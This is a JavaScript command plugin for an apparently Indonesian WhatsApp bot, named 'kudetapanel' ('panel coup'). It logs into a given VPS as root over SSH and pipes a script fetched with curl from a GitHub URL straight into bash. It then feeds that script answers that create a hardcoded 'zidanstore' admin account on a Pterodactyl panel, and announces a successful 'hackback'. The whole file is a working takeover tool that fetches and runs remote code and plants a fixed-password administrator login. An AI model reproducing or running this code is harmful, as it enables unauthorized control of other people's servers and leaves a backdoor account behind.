const { Client } = require('ssh2'); // Mengimpor Client dari ssh2

exports.run = {
    usage: ['kudetapanel'],
    use: 'ipvps,pwvps',
    category: 'cpanel',
    async: async (m, { func, anya }) => {
        if (!m.isDevs) return m.reply('Fitur ini hanya bisa digunakan oleh Developer.');
        if (!m.text) return m.reply(func.example(m.cmd, 'ipvps|pwvps'));

        let t = m.text.split('|');
        if (t.length < 2) return m.reply("Usage:\n IpVPS|PwVPS");

        let ipvps = t[0];
        let passwd = t[1];

        const newuser = "zidanstore";
        const newpw = "zidanstore";

        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };

        const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
        const ress = new Client();

        ress.on('ready', () => {
            ress.exec(command, (err, stream) => {
                if (err) throw err;

                stream.on('close', async (code, signal) => {
                    let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`;
                    await anya.sendMessage(m.chat, { text: teks }, { quoted: m });
                    ress.end();
                }).on('data', async (data) => {
                    await console.log(data.toString());
                }).stderr.on('data', (data) => {
                    stream.write("skyzodev\n");
                    stream.write("7\n");
                    stream.write(`${newuser}\n`);
                    stream.write(`${newpw}\n`);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
    },
    devs: true
};